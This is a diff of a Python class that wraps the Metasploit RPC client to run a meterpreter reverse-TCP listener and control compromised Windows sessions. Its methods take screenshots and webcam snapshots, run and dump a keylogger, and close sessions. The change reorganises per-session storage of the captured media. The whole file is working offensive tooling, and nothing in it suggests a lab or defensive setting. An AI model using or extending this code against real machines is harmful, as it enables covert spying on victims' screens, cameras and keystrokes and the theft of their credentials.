@@ -1,5 +1,6 @@
 from metasploit.msfrpc import MsfRpcClient
 from tools import explorer
+from tools import media
 from tools import screenshot
 from tools import webcam
 from tools import information
@@ -11,8 +12,6 @@ import socket
 import fcntl
 import struct
 
-MAX_SCREENSHOT = 6
-MAX_SNAPSHOT = 6
 
 class MsfToolbox:
 	"""
@@ -32,19 +31,13 @@ class MsfToolbox:
         #self._ip = '192.168.4.1'
 		self._ip = '172.21.42.1'
 
-		# Screenshots infos
-		screenshot.remove_screenhots()
-		self._screenshot_id = 0
-		self._screenshot_number = 0
-
-		# Webcam snapshots infos
-		webcam.remove_snapshots()
-		self._snapshot_id = 0
-		self._snapshot_number = 0
+		# Remove old medias
+		media.remove_medias()
 
 
 	def init_client(self):
 		self._client = MsfRpcClient(self._password, port=self._port)
+
 
 	def exploit_multi_handler(self, lport=4444, payload='windows/x64/meterpreter/reverse_tcp'):
 		exploit = self._client.modules.use('exploit', 'multi/handler')
@@ -69,6 +62,13 @@ class MsfToolbox:
 		return self._client.sessions.list
 
 
+	def session_close(self, session):
+		shell = self.get_session_shell(session)
+		shell.write('exit')
+		time.sleep(1)
+		return
+
+
 	def get_session_shell(self, index):
 		return self._client.sessions.session(index)
 
@@ -79,6 +79,7 @@ class MsfToolbox:
 
 	def get_jobs(self):
 	    return self._client.jobs.list
+
 
 	def kill_job(self, id):
 		return self._client.jobs.stop(id)
@@ -124,27 +125,19 @@ class MsfToolbox:
 
 
 	# Screenshot
-	def post_take_screenshot(self, session=1, path="~/screenshot_sample.jpg", count=1, delay=0, record=True, view_screenshots=False):
-		screenshot_path = screenshot.get_screenshot_path(self._screenshot_id)
-
-		# Remove old screenshot
-		if os.path.exists(screenshot_path):
-			os.remove(screenshot_path)
+	def post_take_screenshot(self, session=1, path=None, count=1, delay=0, record=True, view_screenshots=False):
+		screenshot_path = media.get_media_path(session, "screenshots")
 
 		# Take screenshot
 		screenshot.post_take_screenshot(self._client, session, screenshot_path, count, delay, record, view_screenshots)
-
-		# Update counters
-		self._screenshot_id = (self._screenshot_id + 1) % MAX_SCREENSHOT
-		self._screenshot_number = min(self._screenshot_number + 1, MAX_SCREENSHOT)
 
 		# Wait the end of the function (migration or execution of screenshot)
 		while not os.path.exists(screenshot_path):
 			time.sleep(0.1)
 
 
-	def get_screenshots_url(self):
-		return screenshot.get_images_url(self._screenshot_id, self._screenshot_number)
+	def get_screenshots_url(self, session):
+		return media.get_medias_url(session, "screenshots")
 
 
 	# Information
@@ -155,39 +148,26 @@ class MsfToolbox:
 	# Webcam snapshots
 	def post_take_snapshot(self, session):
 		shell = self.get_session_shell(session)
-
-		snapshot_path = webcam.get_snapshot_path(self._snapshot_id)
-
-		# Remove old snapshot
-		if os.path.exists(snapshot_path):
-			os.remove(snapshot_path)
+		snapshot_path = media.get_media_path(session, "snapshots")
 
 		# Take snapshot
 		webcam.post_take_snapshot(shell, snapshot_path)
 
-		# Update counters if snapshot was created
-		#if os.path.exists(snapshot_path):
-		self._snapshot_id = (self._snapshot_id + 1) % MAX_SNAPSHOT
-		self._snapshot_number = min(self._snapshot_number + 1, MAX_SNAPSHOT)
 
+	def get_snapshots_url(self, session):
+		return media.get_medias_url(session, "snapshots")
 
-	def get_snapshots_url(self):
-		return webcam.get_snapshots_url(self._snapshot_id, self._snapshot_number)
-
+	# Keylogger
 	def start_keylogger(self, session):
 		shell = self.get_session_shell(session)
 		return keylogger.start(shell)
 
+
 	def stop_keylogger(self, session):
 		shell = self.get_session_shell(session)
 		return keylogger.stop(shell)
-	
+
+
 	def dump_keylogger(self, session):
 		shell = self.get_session_shell(session)
 		return keylogger.dump(shell)
-
-	def session_close(self, session):
-		shell = self.get_session_shell(session)
-		shell.write('exit')
-		time.sleep(1)
-		return
